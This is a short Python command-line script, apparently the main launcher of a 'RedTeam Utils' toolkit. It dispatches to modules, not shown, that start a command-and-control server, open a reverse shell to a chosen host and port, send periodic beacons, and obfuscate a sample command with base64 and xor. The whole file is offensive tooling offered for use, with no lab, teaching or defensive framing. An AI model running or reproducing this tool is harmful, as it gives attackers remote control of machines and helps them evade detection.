import argparse   
from core import c2, reverse_shell, beacon, obfuscator

def main():
    parser = argparse.ArgumentParser(description="RedTeam Utils - C2, Reverse Shell, Beacon, Obfuscation")
    parser.add_argument("--c2", type=int, help="Start C2 server on given port")
    parser.add_argument("--reverse", nargs=2, metavar=("HOST", "PORT"), help="Start reverse shell to HOST PORT")
    parser.add_argument("--beacon", nargs=3, metavar=("HOST", "PORT", "INTERVAL"), help="Start beacon to HOST PORT every INTERVAL seconds")
    parser.add_argument("--encode", nargs="+", help="Obfuscate a sample command with encoders (base64, xor)")

    args = parser.parse_args()

    if args.c2:
        c2.start_c2_server(bind_port=args.c2)

    elif args.reverse:
        host, port = args.reverse
        reverse_shell.start_reverse_shell(host, int(port))

    elif args.beacon:
        host, port, interval = args.beacon
        beacon.start_beacon(host, int(port), int(interval))


    elif args.encode:
        cmd = "whoami"  # sample command
        print("=== RedTeam Utils ===")
        print(f"[*] Original: {cmd}")
        obf = cmd
        for enc in args.encode:
            obf = obfuscator.apply_obfuscation(obf, [enc])
        print(f"[*] Obfuscated: {obf}")

    else:
        parser.print_help()

if __name__ == "__main__":
    main()
